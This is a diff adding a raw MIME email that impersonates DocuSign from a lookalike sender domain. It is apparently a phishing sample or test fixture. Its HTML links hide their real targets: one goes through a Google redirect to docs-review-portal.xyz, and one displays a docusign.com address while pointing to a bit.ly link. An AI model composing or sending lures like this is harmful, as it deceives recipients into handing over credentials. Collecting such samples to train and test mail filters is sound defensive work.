@@ -1,0 +1,28 @@
+From: "DocuSign via Secure Mail" <dse@secure-docsign-mail.com>
+To: j.tan@acme-corp.com
+Subject: Completed: Please review and sign 'Q3 Agreement.pdf'
+Date: Thu, 24 Sep 2026 09:30:00 +0000
+Message-ID: <7546541896@mail.example.net>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============2246891052733010492=="
+
+--===============2246891052733010492==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Your document is ready. Review: https://bit.ly/3xQ9kLm
+
+--===============2246891052733010492==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body><p>Your document is ready.</p>
+<p><a href=3D"https://www.google.com/url?q=3Dhttps%3A%2F%2Fdocs-review-portal=
+.xyz%2Fsign%3Fid%3D7781&sa=3DD">REVIEW DOCUMENT</a></p>
+<p>Or open: <a href=3D"https://bit.ly/3xQ9kLm">https://app.docusign.com/docum=
+ents/details</a></p>
+<p>Powered by Docusign</p></body></html>
+
+--===============2246891052733010492==--
